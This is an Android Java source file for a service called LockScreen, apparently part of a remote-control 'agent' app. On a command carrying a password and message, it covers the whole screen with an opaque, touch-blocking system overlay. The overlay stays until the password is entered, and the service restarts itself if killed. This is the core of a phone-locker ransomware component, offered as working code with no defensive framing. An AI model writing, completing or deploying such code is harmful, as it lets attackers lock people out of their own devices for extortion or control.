package com.zero.agent;
import android.app.Service; import android.content.Context; import android.content.Intent; import android.graphics.PixelFormat; import android.os.IBinder; import android.view.Gravity; import android.view.View; import android.view.WindowManager; import android.widget.Button; import android.widget.EditText; import android.widget.LinearLayout; import android.widget.TextView; import android.widget.Toast;
public class LockScreen extends Service {
    private WindowManager wm; private View lockView; private String password = "123";
    public IBinder onBind(Intent i) { return null; }
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            password = intent.getStringExtra("pass");
            String msg = intent.getStringExtra("msg");
            showLockScreen(msg, password);
        }
        return START_STICKY;
    }
    private void showLockScreen(String msg, String pwd) {
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        if (lockView != null) wm.removeView(lockView);
        LinearLayout layout = new LinearLayout(this); layout.setOrientation(LinearLayout.VERTICAL); layout.setBackgroundColor(0xFF000000); layout.setGravity(Gravity.CENTER); layout.setPadding(50,50,50,50);
        TextView tv = new TextView(this); tv.setText(msg); tv.setTextColor(0xFFFFFFFF); tv.setTextSize(24); tv.setGravity(Gravity.CENTER); layout.addView(tv);
        EditText et = new EditText(this); et.setHint("Masukkan Password"); et.setTextColor(0xFFFFFFFF); layout.addView(et);
        Button btn = new Button(this); btn.setText("UNLOCK"); btn.setOnClickListener(v -> {
            if (et.getText().toString().equals(pwd)) { wm.removeView(lockView); lockView = null; stopSelf(); }
            else { Toast.makeText(this, "Password Salah!", Toast.LENGTH_SHORT).show(); }
        }); layout.addView(btn);
        
        // PERBAIKAN: Overlay dibuat FULLSCREEN, FOCUSABLE (bisa diketik), dan BLOCK TOUCHES (tidak tembus)
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON, PixelFormat.OPAQUE
        );
        params.gravity = Gravity.TOP | Gravity.START; params.x = 0; params.y = 0;
        lockView = layout; wm.addView(lockView, params);
    }
    public void onDestroy() { if (lockView != null) wm.removeView(lockView); super.onDestroy(); }
}